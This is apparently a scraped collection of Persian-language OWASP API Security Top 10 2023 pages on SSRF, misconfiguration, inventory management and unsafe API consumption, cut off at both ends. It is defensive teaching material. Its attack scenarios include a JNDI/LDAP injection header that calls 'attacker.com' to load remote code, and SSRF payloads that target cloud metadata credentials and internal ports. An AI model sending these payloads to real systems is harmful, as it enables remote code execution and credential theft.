مکانیزم‌های حفاظتی مختلف برای کاهش تهدیدات خودکار اشاره شده است. برخی از این مکانیزم‌ها ساده‌تر هستند و برخی دیگر پیچیده‌تر. روش‌های مختلفی برای کاهش سرعت تهدیدات خودکار مورد استفاده قرار می‌گیرد:\n\n- شناسایی دستگاه: این روش از طریق شناسایی و ممنوعیت دسترسی به دستگاه‌های ناشناخته می‌تواند مهاجمان را وادار به استفاده از راهکارهای پیچیده‌تری کند که برای آنها هزینه بیشتری دارد. مثلاً، سیستم ممکن است دسترسی مرورگرهای بدون رابط کاربری را ممنوع کند.\n- شناسایی انسان: از راهکارهایی مانند Captcha یا راهکارهای بیومتریک پیشرفته‌تر مانند الگوهای تایپ کردن برای شناسایی کاربران انسانی استفاده می‌شود.\n- الگوهای غیرانسانی: با تجزیه و تحلیل الگوهای عملکرد کاربران می‌توان الگوهای غیرانسانی را شناسایی کرد. به عنوان مثال، دسترسی کاربر به عملیات \"افزودن به سبد خرید\" و \"تکمیل خرید\" در کمتر از یک ثانیه، ممکن است نشانه‌ای از الگوی غیرانسانی باشد.\n- مسدود کردن آدرس‌های IP از گره‌های خروجی Tor و پروکسی‌های معروف: این روش به مسدود کردن آدرس‌های IP  مخصوص می‌پردازد که ممکن است توسط مهاجمان مورد استفاده قرار گیرد.\n- محدود کردن دسترسی به API‌های مصرفی مستقیم توسط دستگاه‌ها (مانند API‌های توسعه‌دهندگان و B2B) مهاجمان را از دسترسی آسان به این API‌ها بازمی‌دارد. از آن‌جایی که این نوع API‌ها اغلب تمام مکانیزم‌های حفاظتی مورد نیاز را پیاده‌سازی نمی‌کنند، معمولا برای مهاجمان هدف آسانی می‌باشند.\n\n## مراجع\n\n- [OWASP Automated Threats to Web Applications][1]\n- [API10:2019 Insufficient Logging & Monitoring][2]\n\n[1]: https://owasp.org/www-project-automated-threats-to-web-applications/\n[2]: https://owasp.org/API-Security/editions/2019/en/0xaa-insufficient-logging-monitoring/\n", "timestamp": "2025-10-24T22:26:53.348466"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0xa7-server-side-request-forgery.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0xa7-server-side-request-forgery.md", "content": "# API7:2023 جعل درخواست در سمت سرور(SSRF)\n\n| ضعف امنیتی | عوامل تهدید / مسیر حمله | پیامد |\n|---------|--------------------|------------|\n| خاص API / قابلیت بهره‌برداری: آسان |  میزان شیوع: متداول/ قابلیت تشخیص: آسان              | پیامد فنی: متوسط / خاص کسب و کار     |\n| برای بهره‌برداری از این آسیب‌پذیری، مهاجم تابع انتهایی APIی را پیدا کند که به URI مشتری، دسترسی می‌دهد. به طور کلی، SSRF ابتدایی (که بر مبنای feedback حاصل از موفقیت یا شکست حمله طراحی شده) نسبت به SSRF کور راحت‌تر بهره‌برداری می‌شود.              | مفاهیم جدید در توسعه نرم‌افزارها، توسعه‌دهندگان را تشویق می‌کنند تا از URI های ارائه شده توسط مشتریان استفاده کنند. یکی از مشکلات رایج در اینجا این است که URI ارائه شده توسط مشتری به درستی اعتبارسنجی نشده یا اصلاح نشده باشند. برای تشخیص این مشکل، درخواست‌ها و پاسخ‌های API در روند توسعه و تست برنامه باید تجزیه و تحلیل شوند. وقتی که پاسخی به مشتری برنگشت داده نمی‌شود (مثل SSRF کور)، تشخیص و رفع آسیب‌پذیری نیاز به تلاش و خلاقیت بیشتری دارد.     | اگر مهاجمی حمله SSRF را با موفقیت انجام دهد، ممکن است به نتایجی نظیر شناسایی خدمات داخلی سرور (مانند اسکن پورت‌ها)، دسترسی به اطلاعات محرمانه افشا شده، دور زدن دیواره‌ی آتش‌ و دیگر مکانیزم‌های امنیتی دست یابد. در برخی موارد، این نوع حمله می‌تواند منجر به اختلال در ارائه سرویس (DoS) شود و باعث شود مهاجم از سرور به عنوان یک پروکسی برای پنهان کردن فعالیت‌های مخرب استفاده کند.         |\n\n## آیا API از نظر جعل درخواست در سمت سرور ‌‌‌آسیب‌پذیر است؟\n\nاین آسیب‌پذیری زمانی رخ می‌دهد که یک API بدون اعتبارسنجی URL کاربر، منبعی را از راه دور درخواست می‌کند. این مسئله به مهاجم این امکان را می‌دهد تا اپلیکیشن را وادار کند حتی در صورت داشتن دیوار آتش یا شبکه خصوصی مجازی، درخواست‌هایی ساختگی ایجاد کرده و به مقصدی دور از انتظار ارسال کند.\nمفاهیم مدرن در توسعه برنامه‌ها باعث می‌شود که مشکلات مربوط به این آسیب‌پذیری رایج‌تر و خطرناک‌تر شوند.\n-\tموارد رایج‌تر: مفاهیم زیر، توسعه‌دهندگان را تشویق می‌کنند تا براساس ورودی کاربر به منابع خارجی دسترسی پیدا کنند: وب‌هوک‌ها، دریافت فایل از URLها، سفارشی‌سازی SSO و پیش‌نمایش URLها.\n-\tموارد خطرناک‌تر: فناوری‌های مدرن مانند ارائه‌دهندگان فضای ابری، Kubernetes و Docker امکان قرارگیری رابط‌های مدیریت و کنترل را از طریق HTTP روی مسیرهای پیش‌بینی‌پذیر و شناخته‌شده فراهم آورده‌اند. این کانال‌ها مورد هدف مستقیم مهاجمان برای حملات SSRF قرار می‌گیرند.\nدر برنامه‌های مدرن که ارتباطات پیوسته و بدون وقفه با سایر اجزای سیستم دارند، کنترل ترافیک خروجی از برنامه به دلیل پیچیدگی ارتباطات بیشتر چالش‌برانگیز‌ است.\nخطر SSRF نمی‌تواند به طور کامل از بین برود. بنابراین در هنگام انتخاب یک مکانیزم حفاظتی، مهم است که خطرات و نیازهای تجاری را در نظر گرفت.\n\n## مثال‌‌‌‌هایی از سناریوهای حمله\n\n### سناریو #1\n\nیک شبکه اجتماعی به کاربران امکان بارگذاری تصویر برای پروفایل کاربری خود را می‌دهد. کاربر می‌تواند تصویر را از دستگاه بارگذاری کرده یا URL آن را وارد کند. در صورت وارد کردن URL، API زیر فراخوانی می‌شود:\n\n```http\nPOST /api/profile/upload_picture\n\n{\n  \"picture_url\": \"http://example.com/profile_pic.jpg\"\n}\n```\n\nمهاجم می‌تواند URL مخربی را ارسال کرده و با استفاده از تابع انتهایی API، پورت‌های شبکه داخلی را اسکن کند:\n\n```http\n{\n  \"picture_url\": \"localhost:8080\"\n}\n```\n\nبر اساس زمان پاسخ‌دهی، مهاجم می‌تواند بفهمد که پورت باز است یا خیر.\n\n### سناریو #2\n\nیک محصول امنیتی طوری طراحی شده که وقتی ناهنجاری‌هایی را در شبکه تشخیص دهد، رویدادهای متناسب با آن را تولید می‌کند. برخی از تیم‌ها ترجیح می‌دهند که این رویدادها را در یک سیستم نظارتی عمومی و کلان‌تر مانند SIEM (مدیریت اطلاعات و رویداد امنیتی) بررسی کنند. به این منظور، محصول امنیتی با استفاده از وب‌هوک‌ها امکان ادغام با سایر سیستم‌ها را فراهم می‌آورد.\n\nدر جریان ایجاد یک وب‌هوک جدید، یک تغییر GraphQL ارسال می‌شود که شامل مسیر تابع انتهایی SIEM است:\n\n```graphql\nPOST /graphql\n\n[\n  {\n    \"variables\": {}\n    \"query\": \"mutation {\n      createNotificationChannel(input: {\n        channelName: \"ch_piney\"\n        notificationChannelConfig: {\n          customWebhookChannelConfigs: [\n            {\n              url: \"http://www.siem-system.com/create_new_event\"\n              send_test_req: true\n            }\n          ]\n        }\n      }){\n        channelId\n    }\n    }\"\n  }\n]\n```\n\nدر طول فرآیند ایجاد وب‌هوک، API پشتیبانی یک درخواست آزمایشی به URL وب‌هوک ارائه شده، ارسال می‌کند و پاسخ را به کاربر نشان می‌دهد.  \nمهاجم می‌تواند از این فرآیند بهره برده و درخواست API را به منبعی حساس، مانند یک سرویس فهرست متادیتای ابر داخلی که شامل اطلاعات ورود به حساب‌های کاربری است، تغییر دهد:\n\n```graphql\nPOST /graphql\n\n[\n  {\n    \"variables\": {}\n    \"query\": \"mutation {\n      createNotificationChannel(input: {\n        channelName: \"ch_piney\"\n        notificationChannelConfig: {\n          customWebhookChannelConfigs: [\n            {\n              url: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm\"\n              send_test_req: true\n            }\n          ]\n        }\n      }) {\n        channelId\n      }\n    }\n  }\n]\n```\n\nوقتی برنامه پاسخ این درخواست آزمایشی را ارسال می‌کند، مهاجم می‌تواند اطلاعات ورود به حساب کاربری در محیط ابری را مشاهده کند.\n\n## چگونه از ‌‌‌آسیب‌پذیری جعل درخواست در سمت سرور پیشگیری کنیم؟\n\n- جداسازی مکانیزم بازیابی منابع در شبکه‌: محدود کردن امکان دسترسی به منابع داخلی شبکه توسط مکانیزم‌هایی که برای بازیابی منابع از راه دور طراحی شده‌اند.\n- در صورت امکان، از لیست‌های مجاز استفاده شود.\n  - الگوهای URL و پورت‌ها\n  - انواع رسانه‌های مجاز برای قابلیت‌های خاص\n  - غیرفعال کردن بازنشانی‌های HTTP \n- استفاده از یک تجزیه‌کننده URL امتحان شده برای جلوگیری از مشکلات ناشی از عدم انطباق در تجزیه URL\n- اعتبارسنجی و پاکسازی تمام داده‌های ورودی از سوی مشتری\n- عدم ارسال داده خام به مشتری\n\n## مراجع\n\n- [OWASP](https://owasp.org/)\n- [Server Side Request Forgery][1]\n- [Server-Side Request Forgery Prevention Cheat Sheet][2]\n\n### خارجی\n\n- [CWE-918: Server-Side Request Forgery (SSRF)][3]\n- [URL confusion vulnerabilities in the wild: Exploring parser inconsistencies,Snyk][4]\n\n[1]: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\n[2]: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html\n[3]: https://cwe.mitre.org/data/definitions/918.html\n[4]: https://snyk.io/blog/url-confusion-vulnerabilities/", "timestamp": "2025-10-24T22:26:53.459716"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0xa8-security-misconfiguration.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0xa8-security-misconfiguration.md", "content": "# API8:2023 پیکربندی امنیتی نادرست\n\n| ضعف امنیتی | عوامل تهدید / مسیر حمله | پیامد |\n|---------|--------------------|------------|\n| خاص API / قابلیت بهره‌برداری: آسان |  میزان شیوع: گسترده/ قابلیت تشخیص: آسان              | پیامد فنی: متوسط / خاص کسب و کار\n| مهاجمین غالبا در تلاش برای یافتن حفره‌های وصله نشده، توابع رایج یا فایل‌ها و مسیرهای محافظت نشده به منظور دسترسی غیرمجاز به سیستم هستند. اطلاعات و تکنیک‌های مرتبط با این مسائل به طور عمومی در دسترس بوده و احتمال وقوع حمله در مورد آنها وجود دارد.              | پیکربندی امنیتی نادرست می‌تواند در هر سطحی از API، از سطح شبکه تا سطح اپلیکشن روی دهد. ابزارهای خودکاری وجود دارند که فرایند تشخیص و بهره برداری از پیکربندی‌های نادرست نظیر تشخیص سرویس‌های غیرضروری را انجام می‌دهند.     | پیکربندی امنیتی نادرست نه تنها می‌تواند اطلاعات حساس کاربر را افشا کند بلکه جزئیاتی از سیستم که ممکن است به از دست رفتن کامل سرور منجر شود را نیز در معرض خطر قرار می‌دهد.         |\n\n## آیا API از نظر پیکربندی امنیتی نادرست‌‌‌آسیب‌پذیر است؟\n\nAPI از منظر پیکربندی امنیتی نادرست ‌‌‌آسیب‌پذیر است اگر:\n\n- ایمن سازی امنیتی مناسب در هر قسمت از پشته اپلیکیشن رعایت نشده یا اپلیکیشن مجوزهای با پیکربندی نادرست روی سرویس‌‌‌‌های ابری داشته باشد.\n- جدیدترین وصله‌‌‌‌های امنیتی نصب نشده و سیستم‌‌‌‌ها کاملا بروز نباشند.\n- ویژگی غیرضروری (نظیر Verb اضافی HTTP) فعال باشند.\n- تفاوت‌هایی در نحوه پردازش درخواست‌های ورودی توسط سرورها در زنجیره سرور HTTP وجود داشته باشد.\n- امنیت لایه انتقال (TLS) غیرفعال باشد.\n- دستورات و الزامات امنیتی (نظیر  <LINK> سرایندهای امنیتی) به سوی کلاینت ارسال نشوند.\n- خط مشی اشتراک متقابل منابع (CORS) وجود نداشته یا به درستی ‌پیاده‌سازی نشده باشد.\n- پیام‌‌‌‌های خطا ردپای پشته یا اطلاعات حساس دیگر را افشا نمایند.\n\n## مثال‌‌‌‌هایی از سناریوهای حمله\n\n### سناریو #1\n\nسروری از API یک نرم‌افزار ثبت دسترسی معتبر و متن‌باز با قابلیت توسعه و پشتیبانی از جستجوهای JNDI (واسطه نام‌گذاری و دایرکتوری جاوا) برای ثبت درخواست‌ها و دسترسی‌ها استفاده می‌کند. برای هر درخواست جدید، یک ورودی جدید با الگوی زیر ثبت می‌شود: `http <method> <api_version>/<path> - <status_code>` یک عامل مخرب، درخواست API مشخصی را ارسال می‌کند که در فایل گزارش دسترسی نوشته می‌شود:\n\n```http\nGET /health\nX-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}\n```\n\nاگر مهاجم از یک سرور کنترل از راه دور برای اجرای یک کد مخرب با نام  `Malicious.class`  استفاده کرده و این کد را در سرآیند درخواست `X-Api-Version` قرار دهد، نرم‌افزار گزارش‌دهی، به دلیل تنظیمات پیش‌فرض ناامن خود، این کد مخرب را از سرور مهاجم دانلود کرده و اجرا می‌کند.\n\n### سناریو #2\n\nیک وب‌سایت شبکه‌ی اجتماعی امکان ارسال \"پیام مستقیم\" را فراهم کرده که به کاربران امکان برقراری گفت‌وگوی خصوصی را می‌دهد. برای دریافت پیام‌های جدید در یک گفت‌وگو خاص، وب‌سایت درخواست API زیر را ارسال می‌کند (نیازی به تعامل کاربری نیست):\n\n```http\nGET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA\n```\n\nپاسخ API شامل هدر پاسخ `HTTP Cache-Control` نمی‌شود، به همین علت گفت‌وگوهای خصوصی در مرورگر وب ذخیره شده و به مهاجمان اجازه می‌دهد که آنها را از فایل‌های حافظه نهان مرورگر در فایل‌سیستم بازیابی کنند.\n\n## چگونه از ‌‌‌آسیب‌پذیری پیکربندی امنیتی نادرست پیشگیری کنیم؟\n\nچرخه حیات API بایستی شامل موارد زیر باشد:\n\n- فرایندی تکرار شونده برای ایمن سازی API که منجر به ‌پیاده‌سازی سریع و آسان یک محیط ایمن شود.\n- فرایندی برای بازبینی و بروزرسانی پیکربندی‌‌‌‌ها در سراسر پشته API؛ این بازبینی بایستی موارد از جمله بازبینی هماهنگی بین فایل‌‌‌‌ها، مولفه‌‌‌‌های API و سرویس‌‌‌‌های ابری (نظیر مجوزهای باکت‌‌‌‌های S3) را دربرگیرد.\n- فرایندی خودکار جهت ارزیابی پیوسته و مداوم اثربخشی پیکربندی و تنظیمات اعمال شده در سراسر محیط API و اپلیکیشن.\n\nبعلاوه:\n\n- حصول اطمینان از این که تمام ارتباطات API از سمت مشتری به سرور و هر کارکردهای دیگر روی یک کانال ارتباطی رمزنگاری شده (TLS) انجام می‌شود؛ بدون توجه به اینکه آیا این API داخلی است یا به صورت عمومی منتشر شده است.\n- حصول اطمینان از اینکه API فقط به افعال HTTP مدنظر توسعه دهنده پاسخ می دهد و غیرفعال کردن سایر افعال (نظیر HEAD).\n- APIهایی که انتظار می‌رود دسترسی به آنها از طریق کلاینت‌‌‌‌های مبتنی بر مرورگر (مثلا فرانت WebApp) باشد:\n  - بایستی خط مشی CORS مناسب را بکار گیرند.\n  - شامل سرآیندهای امنیتی قابل اجرا باشند.\n  - محتوا و فرمت‌ داده‌های ورودی را طوری محدود کنید که با نیازها و عملکرد کسب‌وکار سازگار باشند.\n- برای جلوگیری از مشکلات عدم هماهنگی، مطمئن شوید که تمام سرورها در زنجیره سرورهای HTTP (مانند توازن بار، پروکسی‌های معکوس و پیشرو و back-end) درخواست‌های ورودی را به شیوه‌ای یکنواخت پردازش می‌کنند.\n- در موارد قابل اجرا، تمام طرح‌های بارگیری پاسخ API تعریف و اعمال شود، از جمله پاسخ‌های خطا، تا از ارسال جزئیات اشتباه و اطلاعات مهم به مهاجمان جلوگیری گردد.\n- برای همه پاسخ‌هایی که از API دریافت می‌شود، حتی پاسخ‌های شامل پیغام خطا، یک نقشه ساختاری دقیق تعریف شود. این اقدام باعث می‌شود که جزئیات خطاها و سایر اطلاعات حساس به مهاجمان ارسال نشود.\n\n## مراجع\n\n- [OWASP Secure Headers Project][1]\n- [Configuration and Deployment Management Testing - Web Security Testing Guide][2]\n- [Testing for Error Handling - Web Security Testing Guide][3]\n- [Testing for Cross Site Request Forgery - Web Security Testing Guide][4]\n\n### خارجی\n\n- [CWE-2: Environmental Security Flaws][5]\n- [CWE-16: Configuration][6]\n- [CWE-209: Generation of Error Message Containing Sensitive Information][7]\n- [CWE-319: Cleartext Transmission of Sensitive Information][8]\n- [CWE-388: Error Handling][9]\n- [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')][10]\n- [CWE-942: Permissive Cross-domain Policy with Untrusted Domains][11]\n- [Guide to General Server Security][12], NIST\n- [Let's Encrypt: a free, automated, and open Certificate Authority][13]\n\n[1]: https://owasp.org/www-project-secure-headers/\n[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README\n[3]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README\n[4]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery\n[5]: https://cwe.mitre.org/data/definitions/2.html\n[6]: https://cwe.mitre.org/data/definitions/16.html\n[7]: https://cwe.mitre.org/data/definitions/209.html\n[8]: https://cwe.mitre.org/data/definitions/319.html\n[9]: https://cwe.mitre.org/data/definitions/388.html\n[10]: https://cwe.mitre.org/data/definitions/444.html\n[11]: https://cwe.mitre.org/data/definitions/942.html\n[12]: https://csrc.nist.gov/publications/detail/sp/800-123/final\n[13]: https://letsencrypt.org/\n", "timestamp": "2025-10-24T22:26:53.581330"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0xa9-improper-inventory-management.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0xa9-improper-inventory-management.md", "content": "# API9:2023 مدیریت نادرست دارایی‌ها\n\n| ضعف امنیتی | عوامل تهدید / مسیر حمله | پیامد |\n|---------|--------------------|------------|\n| خاص API / قابلیت بهره‌برداری: آسان |  میزان شیوع: گسترده/ قابلیت تشخیص: متوسط              | پیامد فنی: متوسط / خاص کسب و کار\n| نسخه‌های قدیمی API غالبا اصلاح و بروزرسانی نشده‌اند و از آنجا که از مکانیزم‌های دفاعی نوین موجود در APIهای جدید بهره نمی‌برند، راهی آسان برای دسترسی به سیستم‌ها برای مهاجمین فراهم می‌سازند. در برخی موارد، ابزارهای یا تکنیک‌های نفوذ برای حمله به سیستم‌ها از قبل وجود دارند. در موارد دیگر، ممکن است مهاجمان از طریق یک شخص یا سازمان ثالث که هیچ دلیل قانونی برای به اشتراک گذاری اطلاعات با آن وجود ندارد، به اطلاعات حساس دسترسی یابند.              | عدم بروزرسانی مستندات، شناسایی و رفع آسیب پذیری‌ها را دشوارتر می‌کند. همچنین نبود فهرستی از دارایی‌ها و فقدان یک استراتژی مدون برای از دور خارج کردن نسخه‌های قدیمی منجر می‌شود تا سیستم های وصله نشده، مورد استفاده قرار گرفته و در نتیجه آن افشای اطلاعات رخ دهد. امروزه با کمک مفاهیم نوینی نظیر مایکروسرویس‌ها که امکان بکارگیری اپلیکیشن‌ها بصورت مستقل را تسهیل نموده‌اند (نظیر رایانش ابری، k8s یا کوبرنیتس و ...)، یافتن APIهایی که به صورت غیرضروری در معرض دید همگان قرار دارند تبدیل به امری رایج و آسان شده است. استفاده از تکنیک‌هایی مانند Google Dorking، نقض DNS یا استفاده از موتورهای جستجوی ویژه برای انواع مختلف سرورها (دوربین‌های تحت شبکه، روترها، سرورها و غیره) متصل به اینترنت کافی خواهد بود تا مهاجم بتواند اهدافی را کشف کند.     | مهاجم می‌تواند از طریق نسخه‌های قدیمی API که کماکان به پایگاه داده‌ی اصلی متصل هستند، به داده‌ی حساس و یا حتی سرور دسترسی یابد. گاهی اوقات نسخه‌ها یا پیاده‌سازی‌های مختلف API به پایگاه داده‌ای مشترک با داده‌های واقعی متصل هستند. عاملان تهدید ممکن است از endpointهای موجود در نسخه‌های قدیمی API برای دستیابی به توابع مدیریتی استفاده کرده و از آسیب‌پذیری‌های شناخته شده بهره‌برداری کنند.         |\n\n## آیا API از نظر مدیریت نادرست دارایی‌ها ‌آسیب‌پذیر است؟\n\nطبیعت متصل و پراکنده API‌ها و برنامه‌های مدرن چالش‌های جدیدی را به دنبال دارد. سازمان‌ها علاوه بر داشتن درک دقیقی از API‌ها و endpoint های آن‌ها، باید چگونگی به اشتراک گذاری داده با شرکت‌ها یا اشخاص دیگر را درک کنند. این مسأله به امنیت و حفظ حریم خصوصی داده‌ها مرتبط بوده و نیازمند درک کامل و کنترل دقیق بر روی چگونگی استفاده از داده‌ها و اشتراک آن‌ها با سایر ارتباط‌گیرندگان است.  \nاجرای چندین نسخه از یک API نیازمند ارائه منابع مدیریتی اضافی می‌باشد که باید برای هر نسخه از API منابع و زیرساخت مجزا فراهم نموده و از نظر امنیتی بر هر کدام نظارت کرد. \n\nیک API در مستنداتش نقاط کور دارد اگر:\n\n- هدف از وجود API نامشخص بوده و پاسخی برای سوال‌های زیر وجود نداشته باشد:\n  - API در چه محیطی در حال اجرا است (مثلا محیط تست، توسعه، اجرا یا عملیات)؟\n  - چه کسانی بایستی دسترسی شبکه‌ای به API داشته باشند (همه، افراد دخیل یا شرکا)؟\n  - چه نسخه‌ای از API در حال اجرا است؟\n  - چه داده‌ای (نظیر PII) توسط API در حال جمع آوری و پردازش است؟\n  - جریان داده به چه صورت است؟\n- مستندی برای API وجود ندارد یا بروز نیست.\n- برنامه‌ای برای بازنشستگی و از دور خارج شدن هریک از نسخه‌های API  وجود ندارد.\n- فهرست میزبان‌ها وجود ندارد یا قدیمی است.\n\nداشتن دید و لیست‌بندی از چگونگی جریان اطلاعات حساس در سازمان و نحوه تبادل این اطلاعات با شخص‌ها یا سازمان‌های دیگر، نقش مهمی در برنامه واکنش به وقوع یک حادثه امنیتی دارد. این اهمیت به ویژه زمانی ظاهر می‌شود که یک نقض امنیتی از سوی شرکت یا سازمان سومی رخ دهد.\n\nیک API دارای نقطه کور در جریان داده است اگر:\n\n- API جریان داده حساسی را با طرف ثالث به اشتراک می‌گذارد و\n  - توجیه تجاری یا تأییدی برای این جریان وجود ندارد.\n  - موجودیت یا دیدگاهی از این جریان وجود ندارد.\n  - دیدگاه دقیقی از نوع داده حساسی که به اشتراک گذاشته می‌شود، وجود ندارد.\n\n## مثال‌هایی از سناریوهای حمله\n\n### سناریو #1\n\nیک شبکه اجتماعی از مکانیزم محدودسازی نرخ ارسال درخواست برای جلوگیری از انجام حملات Brute Force توسط مهاجمین جهت حدس توکن‌های تغییر گذرواژه بهره می‌برد. این مکانیزم نه به عنوان بخشی از کد API، بلکه به عنوان مولفه ای مابین کلاینت و API اصلی (در www.socialnetwork.com) ‌پیاده‌سازی شده است. مهاجم یک نسخه بتا از میزبان API (www.mbasic.beta.socialnetwork.com) می‌یابد که از API یکسانی بهره می‌برد و رویه تغییر گذرواژه یکسانی دارد با این تفاوت که در آن هیچ مکانیزمی جهت محدودسازی نرخ درخواست تعبیه نشده است؛ در نتیح...\n\n### سناریو #2\n\nتوسعه‌دهندگان برنامه‌های مستقل می‌توانند با یک شبکه اجتماعی ادغام شوند. به عنوان بخشی از این فرآیند، اجازه‌نامه‌ای به کاربر نهایی ارائه می‌شود تا شبکه اجتماعی بتواند اطلاعات شخصی کاربران را با برنامه مستقل به اشتراک بگذارد. جریان داده بین شبکه اجتماعی و برنامه‌های مستقل، محدود نیست و نظارت کافی بر آن نمی‌شود. درنتیجه برنامه‌های مستقل به جز اطلاعات کاربر، به اطلاعات خصوصی تمام دوستان آن‌ها دسترسی پیدا می‌کنند. یک شرکت مشاوره، برنامه مخربی ایجاد کرده و توانسته از 270،000 کاربر اجازه‌ دسترسی به اطلاعاتشان ر...\n\n## چگونه از ‌آسیب‌پذیری مدیریت نادرست دارایی‌ها پیشگیری کنیم؟\n\n- فهرستی از تمامی میزبان‌های API تهیه شده و جنبه‌های مهم هرکدام با تمرکز بر محیط API (محیط تست، توسعه، اجرا یا عملیات)، افراد مجاز به دسترسی شبکه‌ای به میزبان (همه، افراد دخیل یا شرکا) و نسخه API مستند شود.\n- فهرستی از سرویس‌های یکپارچه تهیه شده و جنبه‌های مهم این سرویس‌ها نظیر نقش آنها، داده‌ی مبادله شده (جریان داده) و میزان حساسیت آنها مستند شود.\n- تمامی جنبه‌های API نظیر نحوه احراز هویت، خطاها، ریدایرکت‌ها، محدودسازی نرخ درخواست، خط مشی‌های اشتراک گذاری متقابل منابع (CORS) و نقاط پایانی یا توابع انتهایی (Endpointها) شامل پارامترها، درخواست‌ها و پاسخ‌ها مستند شوند.\n- با بکارگیری و انطباق با استانداردهای باز، فرایند تولید مستند بطور خودکار انجام شده و این فرایند در CI/CD Pipeline تعبیه گردد.\n- مستندات API در اختیار افرادی که مجاز به دسترسی به API هستند قرار گیرد.\n- از مکانیزم‌های محافظتی خارجی از جمله فایروال‌های امنیت API برای محافظت از تمامی نسخه‌های در معرض دید API (نه فقط نسخه فعلی) استفاده گردد.\n- از استفاده همزمان نسخه‌های عملیاتی شده و عملیاتی نشده API اجتناب شود. اگر این همزمانی اجتناب ناپذیر است، برای نسخه‌های عملیاتی نشده API نیز باید همان حفاظت‌های امنیتی نسخه‌های عملیاتی شده برقرار باشد.\n- هنگامی که در نسخه‌های جدیدتر API بهبودهای امنیتی اعمال می‌شود، بایستی فرایند تحلیل ریسک نیز صورت پذیرد تا بتوان تصمیمات لازم در خصوص اقدامات جبرانی برای رفع مشکلات امنیتی نسخه‌های قدیمی‌تر را اتخاذ نمود. بعنوان نمونه، آیا می‌توان بدون تحت‌الشعاع قراردادن انطباق‌پذیری API بهبودهای امنیتی را در نسخه‌های قدیمی نیز وارد نمود یا اینکه بایستی تمامی نسخه‌های قدیمی به سرعت از دسترس خارج شده و تمامی کلاینت‌های مجبور به استفاده از آخرین نسخه شوند؟\n\n## مراجع\n\n### خارجی\n\n- [CWE-1059: Incomplete Documentation][1]\n\n[1]: https://cwe.mitre.org/data/definitions/1059.html\n", "timestamp": "2025-10-24T22:26:53.690512"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0xaa-unsafe-consumption-of-apis.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0xaa-unsafe-consumption-of-apis.md", "content": "# API10:2023 استفاده ناایمن از APIها\n\n| ضعف امنیتی | عوامل تهدید / مسیر حمله | پیامد |\n|---------|--------------------|------------|\n| خاص API / قابلیت بهره‌برداری: آسان |  میزان شیوع: متداول/ قابلیت تشخیص: متوسط              | پیامد فنی: شدید / خاص کسب و کار\n| برای بهره‌برداری از این آسیب‌پذیری مهاجم باید APIها یا خدمات دیگری که با آنها ادغام شده را شناسایی کرده و به آنها نفوذ کند. این اطلاعات به صورت عمومی در دسترس نبوده یا API سرویس‌های آن به آسانی قابل بهره‌برداری نیستند.              | توسعه‌دهندگان معمولا به endpointهای APIهای خارجی یا طرف ثالثی که در ارتباط هستند، اعتماد می‌کنند. آنها این تصور را دارند که الزامات امنیتی ضعیف‌تری مانند امنیت در انتقال اطلاعات، احراز هویت و دسترسی و اعتبارسنجی و تصفیه اطلاعات ورودی، امنیت کافی برای این نقاط را تامین می‌کند. مهاجمان باید خدماتی را که API هدف با آنها ادغام می‌شود (منابع داده) شناسایی کرده و سعی کنند که آنها را مختل کرده یا به صورت غیرمجاز به آنها دسترسی پیدا کنند.     | پیامد این وضعیت به نحوه استفاده از داده‌های بهره‌برداری شده بستگی دارد. بهره‌برداری موفق از این آسیب‌پذیری ممکن است منجر به افشای اطلاعات حساس به اشخاص غیرمجاز شود. انواع مختلف حملاتی که در نتیجه بهره‌برداری از این آسیب‌پذیری ممکن است رخ دهد مانند حملات تزریق‌ها یا DoD خواهد بود.         |\n\n## آیا API از نظر استفاده ناایمن از APIها ‌آسیب‌پذیر است؟\n\nتوسعه‌دهندگان معمولاً به داده‌های دریافتی از API‌های طرف ثالث بیشتر از ورودی‌های کاربران اعتماد می‌کنند. این موضوع برای API‌های ارائه شده توسط شرکت‌های معروف بیشتر صدق می‌کند. به همین دلیل، توسعه‌دهندگان عمدتاً استانداردهای امنیتی ضعیف‌تری را در بسیاری از موارد از جمله اعتبارسنجی و تصفیه ورودی اتخاذ می‌کنند.\n\nAPI‌ها ممکن است در معرض آسیب‌پذیری باشند اگر:\n\n- با سایر API ها از طریق یک کانال بدون رمزگذاری ارتباط برقرار کنند.\n- داده‌های جمع‌آوری شده از دیگر API ها را قبل از پردازش یا ارسال به اجزای پایین‌دست به درستی اعتبارسنجی و تصفیه نکنند. \n- محدودیتی در پاسخ‌دهی به درخواست‌های پی‌در‌پی نداشته باشند.\n- تعداد منابع مورد نیاز برای پردازش پاسخ‌های سرویس‌های طرف ثالث را محدود نکنند. \n- بازه زمانی محدود برای ارتباط با سرویس‌های طرف ثالث مشخص نکنند.\n\n## مثال‌‌هایی از سناریوهای حمله\n\n### سناریو #1\n\nدر این سناریو، یک API از آدرس‌های کسب و کار یک سرویس طرف ثالث استفاده می‌کند. وقتی یک کاربر آدرسی را به API  ارائه می‌دهد، آن آدرس به سرویس طرف ثالث ارسال شده و اطلاعات بازگشتی در یک پایگاه داده محلی SQL  ذخیره می‌شود. اشخاص با نیت مخرب، از سرویس طرف ثالث برای ذخیره کردن کدهای تزریقSQL  (SQLi) استفاده می‌کنند. سپس با بکارگیری API آسیب‌پذیر و درج ورودی‌های خاص، می‌تواند اطلاعات مرتبط با 